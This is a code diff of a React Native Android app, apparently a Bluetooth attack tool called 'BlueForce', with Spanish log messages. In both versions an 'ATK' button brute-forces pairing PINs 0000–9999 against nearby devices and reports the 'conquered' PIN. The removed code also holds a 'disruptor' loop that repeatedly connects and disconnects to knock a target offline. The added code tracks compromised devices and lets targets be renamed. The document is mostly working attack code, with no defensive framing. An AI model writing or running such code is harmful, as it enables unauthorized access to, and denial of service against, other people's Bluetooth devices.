@@ -1,154 +1,146 @@
 import React, { useState, useEffect } from 'react';
-import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList, ActivityIndicator } from 'react-native';
+import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList, ActivityIndicator, Modal, TextInput } from 'react-native';
 import RNBluetoothClassic from 'react-native-bluetooth-classic';
+
+const SignalMeter = ({ rssi }) => {
+  let s = 0; if (rssi > -45) s = 5; else if (rssi > -60) s = 4; else if (rssi > -75) s = 3; else if (rssi > -85) s = 2; else if (rssi > -100) s = 1;
+  const c = s >= 4 ? '#00ff88' : s === 3 ? '#ffea00' : '#ff3c00';
+  return (<View style={styles.mC}>{[1, 2, 3, 4, 5].map(b => <View key={b} style={[styles.b, { height: b * 3, backgroundColor: b <= s ? c : '#222' }]} />)}</View>);
+};
 
 export default function App() {
   const [discoveredDevices, setDiscoveredDevices] = useState([]);
-  const [activeTarget, setActiveTarget] = useState(null);
+  const [history, setHistory] = useState({});
+  const [aliases, setAliases] = useState({});
   const [mode, setMode] = useState('IDLE');
-  const [currentPin, setCurrentPin] = useState('READY');
+  const [currentPin, setCurrentPin] = useState('0000');
   const [logs, setLogs] = useState([]);
   const [isScanning, setIsScanning] = useState(false);
+  
+  // ESTADOS PARA RENOMBRAR (MODAL)
+  const [modalVisible, setModalVisible] = useState(false);
+  const [tempName, setTempName] = useState('');
+  const [renamingAddr, setRenamingAddr] = useState('');
 
   const addLog = (msg) => setLogs(p => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 100));
 
-  // PETICIÓN DE PERMISOS MAESTRA
-  const requestPermissions = async () => {
-    if (Platform.OS !== 'android') return true;
-    try {
-      addLog("🕵️ Verificando seguridad de Android...");
-      const granted = await PermissionsAndroid.requestMultiple([
-        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
-        PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
-        PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
-        PermissionsAndroid.PERMISSIONS.BLUETOOTH_ADVERTISE,
-      ]);
-      
-      const allGranted = Object.values(granted).every(res => res === PermissionsAndroid.RESULTS.GRANTED);
-      if (allGranted) {
-        addLog("✅ ACCESO TOTAL CONCEDIDO.");
-        return true;
-      } else {
-        addLog("❌ PERMISOS DENEGADOS por el sistema.");
-        Alert.alert("ATENCIÓN", "Debes aceptar TODOS los permisos para que la App pueda transmitir.");
-        return false;
+  useEffect(() => {
+    (async () => {
+      if (Platform.OS === 'android') {
+        await PermissionsAndroid.requestMultiple([
+          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
+          PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
+          PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
+          PermissionsAndroid.PERMISSIONS.BLUETOOTH_ADVERTISE,
+        ]);
       }
-    } catch (err) {
-      addLog("⚠️ Error en capa de permisos.");
-      return false;
-    }
-  };
-
-  useEffect(() => { requestPermissions(); }, []);
+    })();
+  }, []);
 
   const scan = async () => {
     if (isScanning || mode !== 'IDLE') return;
-    const ok = await requestPermissions();
-    if (!ok) return;
-
-    setIsScanning(true);
-    setDiscoveredDevices([]);
-    addLog("📡 Iniciando radiofrecuencia...");
+    setIsScanning(true); setDiscoveredDevices([]);
     try {
       const devices = await RNBluetoothClassic.startDiscovery();
       setDiscoveredDevices(devices.sort((a,b) => b.rssi - a.rssi));
-      addLog(`🔍 ${devices.length} objetivos en rango.`);
-    } catch (e) {
-      addLog("❌ ERROR: Radio ocupada o Bluetooth apagado.");
-    } finally {
-      setIsScanning(false);
-    }
+    } catch (e) { addLog("❌ Error de comunicación."); }
+    finally { setIsScanning(false); }
   };
 
   const startBruteForce = async (device) => {
-    setActiveTarget(device.address);
     setMode('BRUTE');
-    addLog(`🚀 ATAQUE EN CURSO contra ${device.address}`);
+    addLog(`🚀 ATK: ${device.address}`);
+    RNBluetoothClassic.cancelDiscovery(); 
 
-    try {
-      // LIMPIEZA PREVIA: Detener escaneo para liberar antena
-      await RNBluetoothClassic.cancelDiscovery();
-      addLog("🧹 Antena liberada para ataque.");
-
-      for (let i = 0; i <= 9999; i++) {
-        let m; setMode(c => { m = c; return c; });
-        if (m !== 'BRUTE') break;
-
+    for (let i = 0; i <= 9999; i++) {
+        let m; setMode(c => { m = c; return c; }); if (m !== 'BRUTE') break;
         const pin = i.toString().padStart(4, '0');
         setCurrentPin(pin);
-        
         try {
-          addLog(`💉 Inyectando PIN: ${pin}`);
-          await RNBluetoothClassic.pairDevice(device.address, { pin });
-          
-          await new Promise(r => setTimeout(r, 1200));
-          const bonded = await RNBluetoothClassic.getBondedDevices();
-          if (bonded.some(d => d.address === device.address)) {
-            addLog("🎯 ÉXITO: Vínculo establecido!");
-            setMode('IDLE');
-            Alert.alert("CONQUISTADO", `PIN REAL: ${pin}`);
-            return;
-          }
+            await Promise.race([
+                RNBluetoothClassic.pairDevice(device.address, { pin }),
+                new Promise(r => setTimeout(r, 1500))
+            ]);
+            if (i % 5 === 0) {
+                const bonded = await RNBluetoothClassic.getBondedDevices();
+                if (bonded.some(d => d.address === device.address)) {
+                    setHistory(prev => ({ ...prev, [device.address]: { status: '🔓 CONQUISTADO', pin } }));
+                    setMode('IDLE'); Alert.alert("ÉXITO", `PIN: ${pin}`); return;
+                }
+            }
         } catch (e) {
-          // Ignorar errores de "Clave incorrecta" y seguir
-          if (i > 0 && i % 10 === 0) {
-            addLog("⏲️ Bypass de seguridad parlante...");
-            await new Promise(r => setTimeout(r, 3000));
-          }
+            await new Promise(r => setTimeout(r, 600));
         }
-      }
-    } catch (err) {
-      addLog(`⚠️ FALLO CRÍTICO: ${err.message}`);
     }
     setMode('IDLE');
   };
 
-  const startDisruptor = async (device) => {
-    setMode('DISRUPT');
-    addLog("🔥 MODO DISRUPTOR: Saturando canal...");
-    try {
-      await RNBluetoothClassic.cancelDiscovery();
-      while (true) {
-        let m; setMode(c => { m = c; return c; });
-        if (m !== 'DISRUPT') break;
-        
-        try {
-          // ATAQUE DE DESCONEXIÓN FORZADA
-          await RNBluetoothClassic.connectDevice(device.address);
-          await RNBluetoothClassic.disconnectDevice(device.address);
-        } catch (e) {}
-      }
-    } catch (e) {}
-    setMode('IDLE');
+  const openRename = (addr, current) => {
+    setRenamingAddr(addr);
+    setTempName(current);
+    setModalVisible(true);
+  };
+
+  const saveName = () => {
+    if (tempName) setAliases(p => ({ ...p, [renamingAddr]: tempName.toUpperCase() }));
+    setModalVisible(false);
   };
 
   return (
     <View style={styles.container}>
-      <Text style={styles.title}>BlueForce Diagnostic v5</Text>
-      <View style={styles.panel}>
-        <Text style={styles.label}>ESTADO: {mode}</Text>
-        <Text style={styles.pin}>{currentPin}</Text>
-        <TouchableOpacity style={styles.scanBtn} onPress={scan}>
-          {isScanning ? <ActivityIndicator color="#000" /> : <Text style={styles.stext}>INICIAR BARRIDO</Text>}
-        </TouchableOpacity>
-      </View>
-      <FlatList data={discoveredDevices} keyExtractor={i => i.address} renderItem={({ item }) => (
-        <View style={styles.card}>
-          <View style={{ flex: 1 }}>
-            <Text style={styles.name}>{item.name || "N/A"}</Text>
-            <Text style={styles.mac}>{item.address} | {item.rssi} dBm</Text>
-          </View>
-          <View style={{ flexDirection: 'row' }}>
-            <TouchableOpacity style={styles.btn} onPress={() => startBruteForce(item)} disabled={mode !== 'IDLE'}>
-              <Text style={styles.bt}>ATK</Text>
-            </TouchableOpacity>
-            <TouchableOpacity style={[styles.btn, {backgroundColor:'#ff0044', marginLeft: 5}]} onPress={() => startDisruptor(item)} disabled={mode !== 'IDLE'}>
-              <Text style={styles.bt}>BUG</Text>
-            </TouchableOpacity>
+      <Text style={styles.title}>BlueForce Ghost v8</Text>
+      
+      {/* VENTANA PARA RENOMBRAR */}
+      <Modal visible={modalVisible} transparent={true} animationType="fade">
+        <View style={styles.modalBg}>
+          <View style={styles.modalBody}>
+            <Text style={styles.modalTitle}>ASIGNAR ALIAS</Text>
+            <TextInput 
+                style={styles.input} 
+                value={tempName} 
+                onChangeText={setTempName} 
+                placeholder="Nombre del objetivo..."
+                placeholderTextColor="#666"
+            />
+            <View style={{flexDirection:'row', marginTop: 20}}>
+                <TouchableOpacity style={[styles.mBtn, {backgroundColor:'#333'}]} onPress={() => setModalVisible(false)}>
+                    <Text style={styles.bt}>CANCELAR</Text>
+                </TouchableOpacity>
+                <TouchableOpacity style={[styles.mBtn, {backgroundColor:'#00f2ff', marginLeft: 10}]} onPress={saveName}>
+                    <Text style={[styles.bt, {color:'#000'}]}>GUARDAR</Text>
+                </TouchableOpacity>
+            </View>
           </View>
         </View>
-      )} />
-      {mode !== 'IDLE' && <TouchableOpacity style={styles.stop} onPress={() => setMode('IDLE')}><Text style={styles.bt}>DETENER</Text></TouchableOpacity>}
+      </Modal>
+
+      <View style={styles.panel}>
+        <Text style={styles.st}>MODO: {mode}</Text>
+        <Text style={styles.pinText}>{mode === 'IDLE' ? 'READY' : currentPin}</Text>
+        <TouchableOpacity style={styles.scanBtn} onPress={scan} disabled={mode !== 'IDLE'}>
+          {isScanning ? <ActivityIndicator color="#000" /> : <Text style={styles.scanText}>LOCALIZAR</Text>}
+        </TouchableOpacity>
+      </View>
+
+      <FlatList data={discoveredDevices} renderItem={({ item }) => {
+        const h = history[item.address] || { status: '⚪ NUEVO' };
+        const name = aliases[item.address] || item.name || "DESCONOCIDO";
+        const isC = h.status.includes('🔓');
+        return (
+          <View style={styles.card}>
+            <SignalMeter rssi={item.rssi} />
+            <TouchableOpacity style={{ flex: 1, marginLeft: 15 }} onPress={() => openRename(item.address, name)}>
+              <Text style={styles.name}>{name}</Text>
+              <Text style={styles.mac}>{item.address} | {h.status}</Text>
+            </TouchableOpacity>
+            <View style={{ flexDirection: 'row' }}>
+              <TouchableOpacity style={styles.btn} onPress={() => startBruteForce(item)} disabled={mode !== 'IDLE'}>
+                <Text style={styles.bt}>{isC ? 'RE-CON' : 'ATK'}</Text>
+              </TouchableOpacity>
+            </View>
+          </View>
+        );
+      }} />
       <ScrollView style={styles.logs}>{logs.map((l, i) => <Text key={i} style={styles.lt}>{l}</Text>)}</ScrollView>
     </View>
   );
@@ -157,17 +149,23 @@ export default function App() {
 const styles = StyleSheet.create({
   container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
   title: { color: '#00f2ff', fontSize: 20, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
-  panel: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 20 },
-  label: { color: '#555', fontSize: 10, textAlign: 'center' },
-  pin: { color: '#fff', fontSize: 40, fontWeight: 'bold', textAlign: 'center' },
-  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center', marginTop: 15 },
-  stext: { fontWeight: 'bold' },
-  card: { backgroundColor: '#181818', padding: 15, borderRadius: 10, marginBottom: 8, flexDirection: 'row', alignItems: 'center' },
-  name: { color: '#fff', fontWeight: 'bold', fontSize: 12 },
-  mac: { color: '#666', fontSize: 9 },
-  btn: { backgroundColor: '#333', padding: 12, borderRadius: 8 },
+  panel: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 20, borderBottomWidth: 3, borderBottomColor: '#00f2ff' },
+  st: { color: '#444', fontSize: 10, textAlign: 'center' },
+  pinText: { color: '#fff', fontSize: 50, fontWeight: 'bold', textAlign: 'center', marginBottom: 10 },
+  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
+  scanText: { color: '#000', fontWeight: 'bold' },
+  card: { backgroundColor: '#151a22', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
+  name: { color: '#fff', fontWeight: 'bold', fontSize: 13 },
+  mac: { color: '#444', fontSize: 9 },
+  mC: { flexDirection: 'row', alignItems: 'flex-end', width: 25 },
+  b: { width: 3, marginRight: 2, borderRadius: 1 },
+  btn: { backgroundColor: '#222', padding: 12, borderRadius: 8 },
   bt: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
-  stop: { backgroundColor: '#ff0044', padding: 15, borderRadius: 12, alignItems: 'center', marginBottom: 10 },
-  logs: { height: 120, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 10 },
-  lt: { color: '#333', fontSize: 8, marginBottom: 2 }
+  logs: { height: 80, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 10 },
+  lt: { color: '#333', fontSize: 8 },
+  modalBg: { flex: 1, backgroundColor: 'rgba(0,0,0,0.8)', justifyContent: 'center', alignItems: 'center' },
+  modalBody: { backgroundColor: '#111', padding: 25, borderRadius: 20, width: '80%', borderWith: 1, borderColor: '#333' },
+  modalTitle: { color: '#00f2ff', fontWeight: 'bold', marginBottom: 15 },
+  input: { backgroundColor: '#222', color: '#fff', padding: 10, borderRadius: 10 },
+  mBtn: { padding: 12, borderRadius: 10, flex: 1, alignItems: 'center' }
 });
